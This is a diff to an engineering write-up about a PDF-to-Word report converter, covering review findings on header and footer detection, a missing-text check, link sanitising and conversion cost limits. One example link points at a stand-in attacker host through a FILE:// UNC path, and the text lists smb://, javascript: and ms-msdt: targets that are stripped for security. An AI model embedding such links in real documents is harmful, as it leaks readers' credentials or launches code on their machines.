@@ -611,7 +611,7 @@ the workspace stops syncing for roughly ten seconds while somebody exports a
 Word file.
 
 So, plainly: **server export of many large redacted screenshots is not safe on a
-1 GB box yet** (fixed since; see "After the fix" two paragraphs below)**.** One or two of them is fine and fast, which is the ordinary case
+1 GB box yet** (fixed since; see "After the fix" below). One or two of them is fine and fast, which is the ordinary case
 and the one the buttons exist for. A dozen at the top of the per-image cap sits
 at the container's memory ceiling and stalls collaboration for seconds at a
 time, and the 120 MP budget that admits it was set from the compiler's cost, not
@@ -1119,3 +1119,175 @@ covers one fewer thing that might have wanted it.
 - **The similarity score is a guide rail, not the acceptance test.** Mean
   absolute difference on a 200 px render will not notice a wrong colour in a
   small cell. The contact sheet is what decides, and a human has to look at it.
+
+### What the review found, and what the converter guarantees now
+
+A reviewer took the converter to documents I had not tried and made it delete
+report content twice, with `result.json` still saying `ok`. That is the worst
+shape a bug can have here: the Word file still looks like a report, and the
+missing finding is missing quietly. Both reproductions and the numbers that
+came out of them:
+
+**A long table whose rows differ only by a number.** 120 rows of
+`Host-073 | 10.0.0.73 | Open port finding number 73`. Digit blanking is what
+lets a page number stop being part of a running header's identity, and it made
+every one of those rows the same text. Two of them landed at the same height on
+two pages, cleared a quorum of two, and were the outermost thing in the bottom
+zone. `Host-111` left the Word file and `Host-073` became the footer of every
+page. The repeated `table.header` row was hoisted into the page header on the
+same run.
+
+**A repeated first body line.** US Letter, one inch margins, a running header,
+and the same block of text on every page. The first body line sits about 12 pt
+under the header, inside the glue that holds the lines of one band together, so
+it joined the band: deleted from all four pages, pasted into the Word header.
+
+**Odd and even headers.** Two texts taking turns at the top of the page. On a
+short document both cleared the quorum and every page's Word header read
+"Acme Security Assessment Contoso Consulting Group". On a longer one neither
+reached 60%, so nothing was detected, the bands stayed in the body, the page
+count inflated, and nothing said so.
+
+#### Three layers, because a heuristic will be wrong again
+
+The first two make a wrong guess rare. The third is the guarantee.
+
+**Tighter detection.** A candidate group now has to survive four tests, and
+each one is here because it caught real content being deleted.
+
+1. *Quorum.* `max(2, round(n x 0.6))` is two pages of a four-page document,
+   which is how two table rows became a footer. It is `max(3, ceil(n x 0.6))`
+   now, and a document too short for a fraction to mean anything has to carry
+   the band on every page but one, which has to be the first: a cover may have
+   something else up there, a page in the middle may not.
+2. *Stable digits.* A column holding a number that changes from page to page
+   and is not the page number is body content. `Host-073` fails this; the
+   reference report passes it, because every column of its header and footer
+   either has no digits at all or is the page number.
+3. *Separation.* The candidate has to clear the nearest body row by at least
+   half the body's own line pitch. Measured, as the gap over the pitch:
+
+   | | ratio | |
+   |---|---|---|
+   | real running header, reference report | 1.03 | keep |
+   | real footer, same report | 14.13 | keep |
+   | real page-number footer, letter, 1 in margins | 25.67 | keep |
+   | repeated first body line under a header | 0.13 | drop |
+   | repeated table header and data row | 0.31 | drop |
+   | alternating headers plus body lines | 0.13 | drop |
+
+   0.5 sits in the empty middle. The cluster is grown from the page edge
+   inwards, so when it fails the innermost group is the one that does not
+   belong: drop it and measure again. That is how the real header in the
+   second reproduction survives having a body line stuck to it.
+4. *Outermost.* Nothing else may be printed beyond the band on a page that
+   carries it.
+
+**Per-edge honesty.** The header and the footer are now reported separately,
+and an edge that was found but declined says why in plain words. Alternating
+headers get their own sentence: Word can express odd and even headers and this
+script does not, so it declines the edge rather than concatenating both texts,
+which is what it used to do.
+
+**The safety net.** After conversion, every line of the PDF is looked for in
+the Word file: body, tables, text boxes, headers and footers. A line is present
+when its squashed characters (whitespace, hyphens, dot leaders and invisible
+characters removed) appear unbroken somewhere in the Word file's squashed text.
+If anything is missing, that file is discarded and the report is converted
+again with both repairs off, and the banner says so. If text is still missing
+after that, the converter itself dropped it, and the file is kept with a
+warning naming how many lines and the first of them.
+
+Getting the comparison to be useful took three attempts, and the number that
+matters is on the reference report, which loses nothing and therefore has to
+come back clean:
+
+| comparison | lines reported missing on a report that lost nothing |
+|---|---|
+| word counts per document | 62 |
+| runs of consecutive words per line | 38 |
+| squashed characters per line | 8 |
+| squashed characters per column | **0** |
+
+The false positives were all the same kind of thing: a short token such as
+"1." whose count differs because the converter merged two table cells, a run
+boundary falling inside text the PDF spaced differently, and a two-column table
+row that the converter writes one column at a time rather than across. Columns
+are the pieces that are really contiguous on a page, so they are what gets
+looked for, and a piece under four characters is skipped because "LOW" proves
+nothing either way.
+
+`result.json` carries `textCheck: {pdfLines, missing, fellBack}` so the server
+and the operator can see it happened.
+
+#### Three smaller things the review caught
+
+**Links.** pdf2docx copies a PDF link annotation into the Word file as an
+external relationship, and Word follows it.
+`#link("FILE://attacker.example/share/x")` survives typst as a URI action and
+lands in the .docx as a UNC-resolving hyperlink, which leaks the reader's
+credentials to whoever owns that host; `smb://`, `javascript:` and `ms-msdt:`
+go the same way, and typst turns a bare `\\host\share` into a Launch action.
+Everything but `http`, `https` and `mailto` is now deleted from the PDF before
+the converter sees it, the count goes in a warning, and the finished .docx is
+re-read to confirm no external relationship names anything else. On the seven
+links in the test document, five are removed and `https://example.com/ok` and
+`mailto:team@example.com` are the only external targets left.
+
+**Cost.** The conversion had no bound of its own: the output cap is after the
+fact and the pixel budget counts images, not vector drawings. Three A4 pages of
+120,000 one-point rectangles take typst 3.2 s to write into 1.8 MB and cost the
+converter 30.4 s; at 150 pages the reviewer ran past the two-minute timeout,
+with 651 MB of peak RSS. Four bounds now, all with a wide margin over a real
+report, whose worst page holds 62 drawings in a 294 kB instruction stream: 25 MB
+of compiled PDF (checked by the server before it spawns anything), 300 pages,
+3 MB of instruction stream per page, and 10,000 drawings per page. Checking the
+stream length first is what makes the refusal cheap: the 120,000-shape document
+is refused in 0.04 s, where counting its drawings would have taken 2.0 s.
+Counting on the reference report costs 0.04 s for all 23 pages. On Linux the
+child also sets `RLIMIT_AS`, at 3 GB rather than the 768 MB it is meant to
+stand in for, because PyMuPDF and OpenCV map far more than they touch and a
+tighter limit fails the import of OpenCV itself rather than the runaway.
+
+**A table of contents that half matched.** An entry whose title could not be
+matched to the converted paragraphs was dropped along with the rest of its
+stretch, while the warning said it had been left alone. It fired on any title
+`squash` reduced to nothing, which was every non-Latin title, because the
+reduction was `[^0-9a-z]`. `squash` is Unicode-aware now, and the rebuild is
+all or nothing: one unmatched entry and the converter's own list stays, ugly
+and complete, with a warning that says which it did.
+
+#### What the reproductions do now
+
+| | before | after |
+|---|---|---|
+| table of 120 numbered rows | `Host-111` deleted, `Host-073` in every footer, `ok: true` | no band detected, `Host-111` and `Host-073` each appear once, 0 of 124 lines missing |
+| repeated first body line | deleted from four pages, pasted into the header | header and footer lifted, the body line still in the body and absent from every `header*.xml`, 0 of 84 lines missing |
+| odd and even headers | both texts concatenated into one header | the edge is declined, warning names the alternation, 0 of 44 lines missing |
+| seven links | five dangerous targets in `word/_rels/` | two left, both `http(s)`/`mailto`, and the count reported |
+| 120,000 shapes a page | 30.4 s and 651 MB | refused in 0.04 s |
+
+The reference report is unchanged by all of it: 23 pages against 23, worst page
+0.8962, median 0.9828, the header and footer still lifted, 27 table-of-contents
+entries still rebuilt, 0 of 390 lines missing and no fallback. The starter
+template is unchanged too, at 2 pages against 2.
+
+#### What is still imperfect here
+
+- **The table-of-contents rebuild needs the converter to keep the entries as
+  separate paragraphs.** On a sparse page pdf2docx merges the whole list, and
+  the heading above it, into one paragraph; the repair then declines and says
+  "the table of contents could not be found in the converted file, so it was
+  left as it was". That is the right answer (the list is ugly and complete),
+  but it means the repair is quieter on short documents than on a real report.
+- **The text check compares a line's characters, not its position.** A line
+  that the converter moved to the wrong place is not reported, only one that
+  is gone. Ordering is what the contact sheet is for.
+- **A piece shorter than four characters is not evidence.** Losing a lone
+  "LOW" from a table cell would not be caught, because that string occurs all
+  over a report anyway.
+- **`RLIMIT_AS` is a backstop, not a budget.** At 3 GB it will not stop a
+  conversion that merely uses a lot; the page, size and complexity bounds are
+  what keep the usual case small, and the existing "the child is the OOM
+  victim, not the relay" mapping is what covers the rest. Windows has no
+  `resource` module and relies on the other three.
